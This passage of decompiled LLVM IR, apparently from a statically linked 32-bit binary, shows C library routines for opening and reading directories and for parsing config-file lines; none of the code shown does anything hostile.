  store i32 %v5_8063af1, i32* %v3_8063afb, align 4
  %v1_8063afe = icmp eq i1 %v1_8063af9, false
  br i1 %v1_8063afe, label %dec_label_pc_8063b0d, label %dec_label_pc_8063b00

dec_label_pc_8063b00:                             ; preds = %dec_label_pc_8063ac2
  %v0_8063b03 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_8063b06 = call i32 @free(i32 %v0_8063b03)
  br label %dec_label_pc_8063b2e

dec_label_pc_8063b0d:                             ; preds = %dec_label_pc_8063ac2
  %v2_8063b0d = ptrtoint i32* %stack_var_-36 to i32
  %v3_8063b1a = bitcast i32* %stack_var_-36 to i8*
  %v4_8063b1a = call i32 @memcpy(i8* %v3_8063b1a, i32 ptrtoint (i32* @global_var_807029c.1670 to i32), i32 24)
  %v0_8063b24 = load i32, i32* @esi, align 4
  %v1_8063b24 = add i32 %v0_8063b24, 24
  store i32 %v1_8063b24, i32* %eax.global-to-local, align 4
  %v3_8063b29 = inttoptr i32 %v1_8063b24 to i8*
  %v4_8063b29 = call i32 @memcpy(i8* %v3_8063b29, i32 %v2_8063b0d, i32 24)
  br label %dec_label_pc_8063b2e

dec_label_pc_8063b2e:                             ; preds = %dec_label_pc_8063b00, %dec_label_pc_8063b0d
  %storemerge = phi i32 [ %v4_8063b29, %dec_label_pc_8063b0d ], [ %v1_8063b06, %dec_label_pc_8063b00 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063b31

dec_label_pc_8063b31:                             ; preds = %entry, %dec_label_pc_8063b2e
  %v0_8063b34 = load i32, i32* @esi, align 4
  store i32 %v0_8063b34, i32* %eax.global-to-local, align 4
  %v2_8063b36 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063b36, i32* @ebx, align 4
  store i32 %v0_8063aab, i32* @esi, align 4
  store i32 %v0_8063aa8, i32* @edi, align 4
  ret i32 %v0_8063b34

; uselistorder directives
  uselistorder i32 %v1_8063ab6, { 0, 3, 2, 1, 5, 4, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8063b31, { 1, 0 }
  uselistorder label %dec_label_pc_8063b2e, { 1, 0 }
}

define i32 @__GI_opendir(i8* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8063b3a = load i32, i32* @ebx, align 4
  store i32 591872, i32* @ecx, align 4
  %v4_8063b43 = ptrtoint i8* %arg1 to i32
  store i32 %v0_8063b3a, i32* %edx.global-to-local, align 4
  %v4_8063b4e = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 591872)
  store i32 %v4_8063b43, i32* %edx.global-to-local, align 4
  store i32 %v4_8063b4e, i32* @ebx, align 4
  %tmp = icmp ult i32 %v4_8063b4e, -4095
  br i1 %tmp, label %dec_label_pc_8063b67, label %dec_label_pc_8063b5b

dec_label_pc_8063b5b:                             ; preds = %entry
  %v1_8063b60 = sub i32 0, %v4_8063b4e
  store i32 %v1_8063b60, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8063b8e

dec_label_pc_8063b67:                             ; preds = %entry
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8063b69 = icmp slt i32 %v4_8063b4e, 0
  br i1 %v2_8063b69, label %dec_label_pc_8063bbc, label %dec_label_pc_8063b6d

dec_label_pc_8063b6d:                             ; preds = %dec_label_pc_8063b67
  %v2_8063b6f = ptrtoint i32* %stack_var_-92 to i32
  %v2_8063b75 = call i32 @fstat(i32 %v4_8063b4e, i32 %v2_8063b6f)
  %v2_8063b7d = icmp slt i32 %v2_8063b75, 0
  %v1_8063b7f = icmp eq i1 %v2_8063b7d, false
  br i1 %v1_8063b7f, label %dec_label_pc_8063b92, label %dec_label_pc_8063b81

dec_label_pc_8063b81:                             ; preds = %dec_label_pc_8063b6d
  %v0_8063b81 = load i32, i32* @ebx, align 4
  %v1_8063b8a = call i32 @close(i32 %v0_8063b81)
  store i32 %v0_8063b81, i32* @ecx, align 4
  br label %dec_label_pc_8063b8e

dec_label_pc_8063b8e:                             ; preds = %dec_label_pc_8063b5b, %dec_label_pc_8063b81
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063bbc

dec_label_pc_8063b92:                             ; preds = %dec_label_pc_8063b6d
  %v0_8063b96 = load i32, i32* @ebx, align 4
  store i32 %v0_8063b96, i32* @eax, align 4
  %v0_8063b98 = call i32 @fd_to_DIR()
  %v1_8063b9d = icmp eq i32 %v0_8063b98, 0
  store i32 %v0_8063b98, i32* %edx.global-to-local, align 4
  %v1_8063ba1 = icmp eq i1 %v1_8063b9d, false
  br i1 %v1_8063ba1, label %dec_label_pc_8063bbc, label %dec_label_pc_8063ba3

dec_label_pc_8063ba3:                             ; preds = %dec_label_pc_8063b92
  %v0_8063ba3 = load i32, i32* @ebx, align 4
  %v1_8063bac = call i32 @close(i32 %v0_8063ba3)
  store i32 %v0_8063ba3, i32* @ecx, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_8063bbf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063bbc

dec_label_pc_8063bbc:                             ; preds = %dec_label_pc_8063b92, %dec_label_pc_8063b67, %dec_label_pc_8063b8e, %dec_label_pc_8063ba3
  %v0_8063bbf = phi i32 [ %v0_8063b98, %dec_label_pc_8063b92 ], [ 0, %dec_label_pc_8063b67 ], [ 0, %dec_label_pc_8063b8e ], [ %v0_8063bbf.pre, %dec_label_pc_8063ba3 ]
  ret i32 %v0_8063bbf

; uselistorder directives
  uselistorder i32 %v4_8063b4e, { 1, 3, 2, 0, 4 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8063bbc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8063b8e, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-92 = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8063bcb = ptrtoint i32* %stack_var_-92 to i32
  %v2_8063bd1 = call i32 @fstat(i32 %arg1, i32 %v2_8063bcb)
  %v1_8063bd9 = icmp eq i32 %v2_8063bd1, 0
  %v1_8063bdb = icmp eq i1 %v1_8063bd9, false
  br i1 %v1_8063bdb, label %dec_label_pc_8063c2e, label %dec_label_pc_8063bdd

dec_label_pc_8063bdd:                             ; preds = %entry
  %v1_8063be1 = and i32 %tmp1, 61440
  %v6_8063be6 = icmp eq i32 %v1_8063be1, 16384
  br i1 %v6_8063be6, label %dec_label_pc_8063bfb, label %dec_label_pc_8063bed

dec_label_pc_8063bed:                             ; preds = %dec_label_pc_8063bdd
  store i32 20, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8063c2e

dec_label_pc_8063bfb:                             ; preds = %dec_label_pc_8063bdd
  %v0_8063bff = load i32, i32* @ebx, align 4
  %v3_8063c00 = call i32 @__libc_fcntl(i32 %v0_8063bff, i32 3, i32 16384)
  %v10_8063c08 = icmp eq i32 %v3_8063c00, -1
  br i1 %v10_8063c08, label %dec_label_pc_8063c2e, label %dec_label_pc_8063c0d

dec_label_pc_8063c0d:                             ; preds = %dec_label_pc_8063bfb
  %v1_8063c0d = urem i32 %v3_8063c00, 4
  %v8_8063c10 = icmp eq i32 %v1_8063c0d, 1
  %v1_8063c11 = icmp eq i1 %v8_8063c10, false
  br i1 %v1_8063c11, label %dec_label_pc_8063c21, label %dec_label_pc_8063c13

dec_label_pc_8063c13:                             ; preds = %dec_label_pc_8063c0d
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8063c2e

dec_label_pc_8063c21:                             ; preds = %dec_label_pc_8063c0d
  %v0_8063c25 = load i32, i32* @ebx, align 4
  store i32 %v0_8063c25, i32* @eax, align 4
  %v0_8063c27 = call i32 @fd_to_DIR()
  br label %dec_label_pc_8063c30

dec_label_pc_8063c2e:                             ; preds = %dec_label_pc_8063bfb, %entry, %dec_label_pc_8063c13, %dec_label_pc_8063bed
  br label %dec_label_pc_8063c30

dec_label_pc_8063c30:                             ; preds = %dec_label_pc_8063c21, %dec_label_pc_8063c2e
  %storemerge = phi i32 [ %v0_8063c27, %dec_label_pc_8063c21 ], [ 0, %dec_label_pc_8063c2e ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8063c00, { 1, 0 }
  uselistorder i32 ()* @fd_to_DIR, { 1, 0 }
  uselistorder i32 16384, { 0, 5, 1, 7, 8, 9, 10, 11, 6, 2, 3, 4 }
  uselistorder i32 (i32, i32)* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_8063c30, { 1, 0 }
  uselistorder label %dec_label_pc_8063c2e, { 2, 0, 3, 1 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8063c38 = load i32, i32* @esi, align 4
  %v0_8063c39 = load i32, i32* @ebx, align 4
  store i32 %v0_8063c39, i32* %stack_var_-8, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_8063c41 = add i32 %tmp3, 24
  store i32 %v1_8063c41, i32* @ebx, align 4
  %v4_8063c4f = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134623208, i32 %v1_8063c41)
  %v0_8063c54 = load i32, i32* @ebx, align 4
  %v1_8063c57 = call i32 @__pthread_return_0(i32 %v0_8063c54)
  br label %dec_label_pc_8063c5f

dec_label_pc_8063c5f:                             ; preds = %dec_label_pc_8063c8a, %entry
  %v0_8063c5f = load i32, i32* @esi, align 4
  %v1_8063c5f = add i32 %v0_8063c5f, 8
  %v2_8063c5f = inttoptr i32 %v1_8063c5f to i32*
  %v3_8063c5f = load i32, i32* %v2_8063c5f, align 4
  %v2_8063c62 = add i32 %v0_8063c5f, 4
  %v3_8063c62 = inttoptr i32 %v2_8063c62 to i32*
  %v4_8063c62 = load i32, i32* %v3_8063c62, align 4
  %v6_8063c65 = icmp ugt i32 %v3_8063c5f, %v4_8063c62
  br i1 %v6_8063c65, label %dec_label_pc_8063c8a, label %dec_label_pc_8063c67

dec_label_pc_8063c67:                             ; preds = %dec_label_pc_8063c5f
  %v0_8063c67 = load i32, i32* @edx, align 4
  %v1_8063c68 = add i32 %v0_8063c5f, 20
  %v2_8063c68 = inttoptr i32 %v1_8063c68 to i32*
  %v3_8063c68 = load i32, i32* %v2_8063c68, align 4
  %v1_8063c6b = add i32 %v0_8063c5f, 12
  %v2_8063c6b = inttoptr i32 %v1_8063c6b to i32*
  %v3_8063c6b = load i32, i32* %v2_8063c6b, align 4
  %v1_8063c6e = inttoptr i32 %v0_8063c5f to i32*
  %v2_8063c6e = load i32, i32* %v1_8063c6e, align 4
  %v4_8063c70 = inttoptr i32 %v3_8063c6b to i32*
  %v5_8063c70 = call i32 @__getdents64(i32 %v2_8063c6e, i32* %v4_8063c70, i32 %v3_8063c68, i32 %v0_8063c67)
  %tmp13 = icmp slt i32 %v5_8063c70, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_8063c80, label %dec_label_pc_8063c7c

dec_label_pc_8063c7c:                             ; preds = %dec_label_pc_8063c67
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8063ca8

dec_label_pc_8063c80:                             ; preds = %dec_label_pc_8063c67
  %v1_8063c80 = load i32, i32* @esi, align 4
  %v2_8063c80 = add i32 %v1_8063c80, 8
  %v3_8063c80 = inttoptr i32 %v2_8063c80 to i32*
  store i32 %v5_8063c70, i32* %v3_8063c80, align 4
  %v0_8063c83 = load i32, i32* @esi, align 4
  %v1_8063c83 = add i32 %v0_8063c83, 4
  %v2_8063c83 = inttoptr i32 %v1_8063c83 to i32*
  store i32 0, i32* %v2_8063c83, align 4
  %v0_8063c8a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8063c8a

dec_label_pc_8063c8a:                             ; preds = %dec_label_pc_8063c5f, %dec_label_pc_8063c80
  %v1_8063c98 = phi i32 [ %v0_8063c5f, %dec_label_pc_8063c5f ], [ %v0_8063c8a.pre, %dec_label_pc_8063c80 ]
  %v1_8063c8a = add i32 %v1_8063c98, 4
  %v2_8063c8a = inttoptr i32 %v1_8063c8a to i32*
  %v3_8063c8a = load i32, i32* %v2_8063c8a, align 4
  store i32 %v3_8063c8a, i32* @edx, align 4
  %v2_8063c8f = add i32 %v1_8063c98, 12
  %v3_8063c8f = inttoptr i32 %v2_8063c8f to i32*
  %v4_8063c8f = load i32, i32* %v3_8063c8f, align 4
  %v5_8063c8f = add i32 %v4_8063c8f, %v3_8063c8a
  store i32 %v5_8063c8f, i32* @ebx, align 4
  %v1_8063c92 = add i32 %v5_8063c8f, 16
  %v2_8063c92 = inttoptr i32 %v1_8063c92 to i16*
  %v3_8063c92 = load i16, i16* %v2_8063c92, align 2
  %v4_8063c92 = zext i16 %v3_8063c92 to i32
  %v2_8063c96 = add i32 %v4_8063c92, %v3_8063c8a
  store i32 %v2_8063c96, i32* %v2_8063c8a, align 4
  %v0_8063c9b = load i32, i32* @ebx, align 4
  %v1_8063c9b = add i32 %v0_8063c9b, 8
  %v2_8063c9b = inttoptr i32 %v1_8063c9b to i32*
  %v3_8063c9b = load i32, i32* %v2_8063c9b, align 4
  %v1_8063c9e = load i32, i32* @esi, align 4
  %v2_8063c9e = add i32 %v1_8063c9e, 16
  %v3_8063c9e = inttoptr i32 %v2_8063c9e to i32*
  store i32 %v3_8063c9b, i32* %v3_8063c9e, align 4
  %v0_8063ca1 = load i32, i32* @ebx, align 4
  %v1_8063ca1 = inttoptr i32 %v0_8063ca1 to i32*
  %v2_8063ca1 = load i32, i32* %v1_8063ca1, align 4
  %v2_8063ca3 = add i32 %v0_8063ca1, 4
  %v3_8063ca3 = inttoptr i32 %v2_8063ca3 to i32*
  %v4_8063ca3 = load i32, i32* %v3_8063ca3, align 4
  %v5_8063ca3 = or i32 %v4_8063ca3, %v2_8063ca1
  %v6_8063ca3 = icmp eq i32 %v5_8063ca3, 0
  br i1 %v6_8063ca3, label %dec_label_pc_8063c5f, label %dec_label_pc_8063ca8

dec_label_pc_8063ca8:                             ; preds = %dec_label_pc_8063c8a, %dec_label_pc_8063c7c
  %v3_8063cb1 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8063cb9 = load i32, i32* @ebx, align 4
  %v2_8063cbb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063cbb, i32* @ebx, align 4
  store i32 %v0_8063c38, i32* @esi, align 4
  ret i32 %v0_8063cb9

; uselistorder directives
  uselistorder i32 %v1_8063c98, { 1, 0 }
  uselistorder i32 %v5_8063c70, { 1, 0 }
  uselistorder i32 %v0_8063c5f, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_8063c8a, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp25 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %v15_8063cc4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp25, i32* @esi, align 4
  %v1_8063ccb = icmp eq i32* %arg1, null
  store i1 %v1_8063ccb, i1* %zf.global-to-local, align 1
  br i1 %v1_8063ccb, label %dec_label_pc_8063f43, label %dec_label_pc_8063cd3

dec_label_pc_8063cd3:                             ; preds = %entry
  %sext = mul i32 %arg2, 16777216
  %v4_8063cd8 = sdiv i32 %sext, 16777216
  %v4_8063cd3 = mul i32 %arg2, 4
  %v2_8063ce0 = and i32 %v4_8063cd3, 1020
  %v1_8063ce3 = udiv i32 %v4_8063cd8, 256
  %v2_8063ce3 = urem i32 %v1_8063ce3, 256
  store i32 %v2_8063ce3, i32* %edx.global-to-local, align 4
  %v1_8063cea = or i32 %v2_8063ce0, 1
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %v1_8063cea, i32* %eax.global-to-local, align 4
  %v5_8063cef = inttoptr i32 %v1_8063cea to i8*
  %v1_8063cf3 = add i32 %tmp25, 4
  %v2_8063cf3 = inttoptr i32 %v1_8063cf3 to i32*
  %v1_8063d34 = add i32 %tmp25, 8
  %v2_8063d34 = inttoptr i32 %v1_8063d34 to i32*
  %v2_8063d3c = add i32 %tmp25, 12
  %v3_8063d3c = inttoptr i32 %v2_8063d3c to i32*
  %v1_8063d42 = add i32 %tmp25, 16
  %v2_8063d42 = inttoptr i32 %v1_8063d42 to i32*
  %v1_8063da4 = add i32 %tmp25, 20
  %v2_8063da4 = inttoptr i32 %v1_8063da4 to i8*
  %tmp31 = inttoptr i32 %v1_8063cea to i16*
  br label %dec_label_pc_8063cf3

dec_label_pc_8063cf3:                             ; preds = %dec_label_pc_8063f35, %dec_label_pc_8063e47, %dec_label_pc_8063e3d, %dec_label_pc_8063cd3
  %v3_8063cf3 = load i32, i32* %v2_8063cf3, align 4
  %v4_8063cf3 = icmp eq i32 %v3_8063cf3, 0
  store i1 %v4_8063cf3, i1* %zf.global-to-local, align 1
  %v1_8063cf7 = icmp eq i1 %v4_8063cf3, false
  br i1 %v1_8063cf7, label %dec_label_pc_8063d34, label %dec_label_pc_8063cf9

dec_label_pc_8063cf9:                             ; preds = %dec_label_pc_8063cf3
  %v3_8063cf9 = load i32, i32* %v2_8063d42, align 4
  %v4_8063cf9 = icmp eq i32 %v3_8063cf9, 0
  store i1 %v4_8063cf9, i1* %zf.global-to-local, align 1
  %v1_8063cfd = icmp eq i1 %v4_8063cf9, false
  br i1 %v1_8063cfd, label %dec_label_pc_8063d06, label %dec_label_pc_8063cff

dec_label_pc_8063cff:                             ; preds = %dec_label_pc_8063cf9
  store i32 81, i32* %v2_8063d42, align 4
  br label %dec_label_pc_8063d06

dec_label_pc_8063d06:                             ; preds = %dec_label_pc_8063cf9, %dec_label_pc_8063cff
  %v3_8063d06 = load i32, i32* %v2_8063d34, align 4
  %v4_8063d06 = icmp eq i32 %v3_8063d06, 0
  store i1 %v4_8063d06, i1* %zf.global-to-local, align 1
  %v1_8063d0a = icmp eq i1 %v4_8063d06, false
  br i1 %v1_8063d0a, label %dec_label_pc_8063d13, label %dec_label_pc_8063d0c

dec_label_pc_8063d0c:                             ; preds = %dec_label_pc_8063d06
  %v0_8063d0c = load i32, i32* @esp, align 4
  %v1_8063d0c = add i32 %v0_8063d0c, 4
  %v2_8063d0c = inttoptr i32 %v1_8063d0c to i32*
  %v3_8063d0c = load i32, i32* %v2_8063d0c, align 4
  store i32 %v3_8063d0c, i32* %eax.global-to-local, align 4
  store i32 %v3_8063d0c, i32* %v2_8063d34, align 4
  br label %dec_label_pc_8063d13

dec_label_pc_8063d13:                             ; preds = %dec_label_pc_8063d06, %dec_label_pc_8063d0c
  %v3_8063d13 = phi i32 [ %v3_8063d06, %dec_label_pc_8063d06 ], [ %v3_8063d0c, %dec_label_pc_8063d0c ]
  store i32 %v3_8063d13, i32* %eax.global-to-local, align 4
  %v0_8063d16 = load i32, i32* @esp, align 4
  %v4_8063d19 = load i32, i32* %v2_8063d42, align 4
  %v5_8063d19 = add i32 %v4_8063d19, %v3_8063d13
  %v15_8063d19 = icmp eq i32 %v5_8063d19, 0
  store i1 %v15_8063d19, i1* %zf.global-to-local, align 1
  store i32 %v5_8063d19, i32* %eax.global-to-local, align 4
  %v2_8063d1c = add i32 %v0_8063d16, -16
  %v3_8063d1c = inttoptr i32 %v2_8063d1c to i32*
  store i32 %v5_8063d19, i32* %v3_8063d1c, align 4
  %v2_8063d1d = call i32 @malloc(i32 %v1_8063cea)
  store i32 %v2_8063d1d, i32* %eax.global-to-local, align 4
  %v1_8063d25 = icmp eq i32 %v2_8063d1d, 0
  store i1 %v1_8063d25, i1* %zf.global-to-local, align 1
  store i32 %v2_8063d1d, i32* %v2_8063cf3, align 4
  br i1 %v1_8063d25, label %dec_label_pc_8063f43.loopexit, label %dec_label_pc_8063d30

dec_label_pc_8063d30:                             ; preds = %dec_label_pc_8063d13
  %v3_8063d30 = load i8, i8* %v2_8063da4, align 1
  %v4_8063d30 = or i8 %v3_8063d30, 1
  store i1 false, i1* %zf.global-to-local, align 1
  store i8 %v4_8063d30, i8* %v2_8063da4, align 1
  br label %dec_label_pc_8063d34

dec_label_pc_8063d34:                             ; preds = %dec_label_pc_8063cf3, %dec_label_pc_8063d30
  %v3_8063d34 = load i32, i32* %v2_8063d34, align 4
  store i32 %v3_8063d34, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v4_8063d39 = load i32, i32* %v2_8063cf3, align 4
  %v5_8063d39 = add i32 %v4_8063d39, %v3_8063d34
  %v15_8063d39 = icmp eq i32 %v5_8063d39, 0
  store i1 %v15_8063d39, i1* %zf.global-to-local, align 1
  store i32 %v5_8063d39, i32* %eax.global-to-local, align 4
  store i32 %v5_8063d39, i32* %v3_8063d3c, align 4
  br label %dec_label_pc_8063d3f

dec_label_pc_8063d3f:                             ; preds = %dec_label_pc_8063daa, %dec_label_pc_8063da1, %dec_label_pc_8063d34
  %v0_8063d3f = load i32, i32* @ebp, align 4
  %v1_8063d3f = load i32, i32* @esp, align 4
  %v2_8063d3f = add i32 %v1_8063d3f, -4
  %v3_8063d3f = inttoptr i32 %v2_8063d3f to i32*
  store i32 %v0_8063d3f, i32* %v3_8063d3f, align 4
  %v2_8063d40 = load i32, i32* %arg1, align 4
  %v4_8063d40 = add i32 %v1_8063d3f, -8
  %v5_8063d40 = inttoptr i32 %v4_8063d40 to i32*
  store i32 %v2_8063d40, i32* %v5_8063d40, align 4
  %v3_8063d42 = load i32, i32* %v2_8063d42, align 4
  %v1_8063d45 = load i32, i32* @edi, align 4
  %v2_8063d45 = sub i32 %v3_8063d42, %v1_8063d45
  %v2_8063d47 = add i32 %v1_8063d3f, -12
  %v3_8063d47 = inttoptr i32 %v2_8063d47 to i32*
  store i32 %v2_8063d45, i32* %v3_8063d47, align 4
  %v0_8063d48 = load i32, i32* @edi, align 4
  store i32 %v0_8063d48, i32* %eax.global-to-local, align 4
  %v4_8063d4a = load i32, i32* %v3_8063d3c, align 4
  %v5_8063d4a = add i32 %v4_8063d4a, %v0_8063d48
  %v15_8063d4a = icmp eq i32 %v5_8063d4a, 0
  store i1 %v15_8063d4a, i1* %zf.global-to-local, align 1
  store i32 %v5_8063d4a, i32* %eax.global-to-local, align 4
  %v2_8063d4d = add i32 %v1_8063d3f, -16
  %v3_8063d4d = inttoptr i32 %v2_8063d4d to i32*
  store i32 %v5_8063d4a, i32* %v3_8063d4d, align 4
  %v0_8063d4e = call i32 @fgets()
  store i32 %v0_8063d4e, i32* %eax.global-to-local, align 4
  %v0_8063d53 = load i32, i32* @esp, align 4
  %v1_8063d56 = icmp eq i32 %v0_8063d4e, 0
  store i1 %v1_8063d56, i1* %zf.global-to-local, align 1
  %v1_8063d58 = icmp eq i1 %v1_8063d56, false
  br i1 %v1_8063d58, label %dec_label_pc_8063d72, label %dec_label_pc_8063d5a

dec_label_pc_8063d5a:                             ; preds = %dec_label_pc_8063d3f
  %v0_8063d5a = load i32, i32* @ebx, align 4
  %v2_8063d5a = add i32 %v0_8063d53, 12
  %v3_8063d5a = inttoptr i32 %v2_8063d5a to i32*
  store i32 %v0_8063d5a, i32* %v3_8063d5a, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_8063d5d = load i32, i32* %v2_8063d42, align 4
  %v5_8063d5d = add i32 %v0_8063d53, 8
  %v6_8063d5d = inttoptr i32 %v5_8063d5d to i32*
  store i32 %v3_8063d5d, i32* %v6_8063d5d, align 4
  %v1_8063d60 = add i32 %v0_8063d53, 4
  %v2_8063d60 = inttoptr i32 %v1_8063d60 to i32*
  store i32 0, i32* %v2_8063d60, align 4
  %v3_8063d62 = load i32, i32* %v3_8063d3c, align 4
  %v6_8063d62 = inttoptr i32 %v0_8063d53 to i32*
  store i32 %v3_8063d62, i32* %v6_8063d62, align 4
  %v5_8063d65 = call i32 @__GI_memset(i8* %v5_8063cef, i32 %v2_8063ce0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8063d65, i32* %eax.global-to-local, align 4
  %v0_8063d6a = load i32, i32* @esp, align 4
  %v1_8063d6a = add i32 %v0_8063d6a, 16
  %v6_8063d6a = icmp eq i32 %v1_8063d6a, 0
  store i1 %v6_8063d6a, i1* %zf.global-to-local, align 1
  %v0_8063f48.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8063f45

dec_label_pc_8063d72:                             ; preds = %dec_label_pc_8063d3f
  %v3_8063d72 = load i32, i32* %v3_8063d3c, align 4
  store i32 %v3_8063d72, i32* @ebx, align 4
  %v9_8063d75 = icmp eq i32 %v0_8063d53, -4
  store i1 %v9_8063d75, i1* %zf.global-to-local, align 1
  %v1_8063d78 = load i32, i32* @edi, align 4
  %v2_8063d78 = add i32 %v1_8063d78, %v3_8063d72
  store i32 %v2_8063d78, i32* %eax.global-to-local, align 4
  %v3_8063d7b = inttoptr i32 %v0_8063d53 to i32*
  store i32 %v2_8063d78, i32* %v3_8063d7b, align 4
  %v3_8063d7c = call i32 @strlen(i8* %v5_8063cef)
  store i32 %v3_8063d7c, i32* %eax.global-to-local, align 4
  %v0_8063d81 = load i32, i32* @esp, align 4
  %v1_8063d81 = inttoptr i32 %v0_8063d81 to i32*
  %v2_8063d81 = load i32, i32* %v1_8063d81, align 4
  store i32 %v2_8063d81, i32* %edx.global-to-local, align 4
  %v3_8063d81 = add i32 %v0_8063d81, 4
  %v1_8063d82 = inttoptr i32 %v3_8063d81 to i32*
  %v2_8063d82 = load i32, i32* %v1_8063d82, align 4
  store i32 %v2_8063d82, i32* @ecx, align 4
  store i32 10, i32* %v1_8063d82, align 4
  %v0_8063d85 = load i32, i32* @edi, align 4
  %v2_8063d85 = add i32 %v0_8063d85, %v3_8063d7c
  %v12_8063d85 = icmp eq i32 %v2_8063d85, 0
  store i1 %v12_8063d85, i1* %zf.global-to-local, align 1
  store i32 %v2_8063d85, i32* @edi, align 4
  %v0_8063d87 = load i32, i32* @ebx, align 4
  store i32 %v0_8063d87, i32* %v1_8063d81, align 4
  %v4_8063d88 = call i32 @__GI_strchr(i8* %v5_8063cef, i32 %v2_8063ce0)
  store i32 %v4_8063d88, i32* %eax.global-to-local, align 4
  %v2_8063d90 = icmp eq i32 %v4_8063d88, 0
  store i1 %v2_8063d90, i1* %zf.global-to-local, align 1
  store i32 %v4_8063d88, i32* @edx, align 4
  br i1 %v2_8063d90, label %dec_label_pc_8063da4, label %dec_label_pc_8063d96

dec_label_pc_8063d96:                             ; preds = %dec_label_pc_8063d72
  %v5_8063d88 = inttoptr i32 %v4_8063d88 to i8*
  %v3_8063d96 = load i8, i8* %v5_8063d88, align 1
  %v0_8063d98 = load i32, i32* @edi, align 4
  %v1_8063d98 = add i32 %v0_8063d98, -1
  store i32 %v1_8063d98, i32* @edi, align 4
  %v2_8063d99 = add i8 %v3_8063d96, -1
  %v14_8063d99 = zext i8 %v2_8063d99 to i32
  %v16_8063d99 = and i32 %v4_8063d88, -256
  %v17_8063d99 = or i32 %v14_8063d99, %v16_8063d99
  store i32 %v17_8063d99, i32* %eax.global-to-local, align 4
  %v10_8063d9b = icmp eq i8 %v3_8063d96, 93
  store i1 %v10_8063d9b, i1* %zf.global-to-local, align 1
  store i8 %v2_8063d99, i8* %v5_8063d88, align 1
  %v0_8063d9f = load i1, i1* %zf.global-to-local, align 1
  %v1_8063d9f = icmp eq i1 %v0_8063d9f, false
  br i1 %v1_8063d9f, label %dec_label_pc_8063e10, label %dec_label_pc_8063da1

dec_label_pc_8063da1:                             ; preds = %dec_label_pc_8063d96
  %v0_8063da1 = load i32, i32* @edi, align 4
  %v1_8063da1 = add i32 %v0_8063da1, -1
  %v8_8063da1 = icmp eq i32 %v1_8063da1, 0
  store i1 %v8_8063da1, i1* %zf.global-to-local, align 1
  store i32 %v1_8063da1, i32* @edi, align 4
  br label %dec_label_pc_8063d3f

dec_label_pc_8063da4:                             ; preds = %dec_label_pc_8063d72
  %v3_8063da4 = load i8, i8* %v2_8063da4, align 1
  %v4_8063da4 = icmp eq i8 %v3_8063da4, 0
  store i1 %v4_8063da4, i1* %zf.global-to-local, align 1
  br i1 %v4_8063da4, label %dec_label_pc_8063dd4, label %dec_label_pc_8063daa

dec_label_pc_8063daa:                             ; preds = %dec_label_pc_8063da4
  %v3_8063daa = load i32, i32* %v2_8063d42, align 4
  %v1_8063dad = add i32 %v3_8063daa, 4096
  store i32 %v1_8063dad, i32* %eax.global-to-local, align 4
  store i32 %v1_8063dad, i32* %v2_8063d42, align 4
  %v0_8063db5 = load i32, i32* @ebp, align 4
  %v1_8063db5 = load i32, i32* @esp, align 4
  %v2_8063db5 = add i32 %v1_8063db5, -4
  %v3_8063db5 = inttoptr i32 %v2_8063db5 to i32*
  store i32 %v0_8063db5, i32* %v3_8063db5, align 4
  %v0_8063db6 = load i32, i32* @ebp, align 4
  %v2_8063db6 = add i32 %v1_8063db5, -8
  %v3_8063db6 = inttoptr i32 %v2_8063db6 to i32*
  store i32 %v0_8063db6, i32* %v3_8063db6, align 4
  %v0_8063db7 = load i32, i32* %eax.global-to-local, align 4
